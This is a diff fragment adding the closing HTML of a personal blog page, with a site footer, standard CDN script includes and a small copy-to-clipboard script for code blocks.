+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Exploooosion
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
